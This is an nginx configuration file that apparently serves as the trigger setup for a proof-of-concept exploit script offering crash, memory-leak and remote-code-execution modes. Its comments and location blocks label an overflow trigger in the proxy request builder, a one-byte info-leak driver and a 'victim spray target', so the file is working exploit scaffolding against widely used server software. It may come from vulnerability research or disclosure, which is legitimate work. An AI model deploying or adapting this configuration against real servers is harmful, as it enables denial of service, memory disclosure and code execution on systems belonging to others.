# Trigger config for poc.py (--crash, --leak, --rce).
#   mkdir -p logs; /path/to/nginx -c nginx_poc.conf -p .
# The backend (127.0.0.1:19999) need not exist; the overflow fires in
# ngx_http_proxy_create_request before nginx connects.

worker_processes  1;
daemon            off;
master_process    off;
# error_log         logs/error.log  debug;
# pid               logs/nginx.pid;

events {
    worker_connections  256;
}

http {
    access_log  off;

    client_body_buffer_size      64k;
    client_body_in_single_buffer on;

    map $request_body $bodyvar {          # overflow driver (regex vs body)
        "~^(.{100,})$"  mapped;
        default         nomatch;
    }
    map $http_x_lk $lv2 {                  # leak driver (1-byte header match)
        "~^(.)$"  "";
        default   "";
    }

    server {
        listen  127.0.0.1:8950;

        location = / { return 200 "alive\n"; }   # warmup / liveness
        location /   { return 200 "ok\n"; }       # victim spray target

        location ~ "^/l2/(.+)$" {                 # info leak
            return 200 "$1$lv2\n";
        }
        location ~ "^/b/(.{1,3})$" {              # overflow trigger
            proxy_method  "$1=$bodyvar=$1";
            proxy_pass    http://127.0.0.1:19999;
        }
    }
}
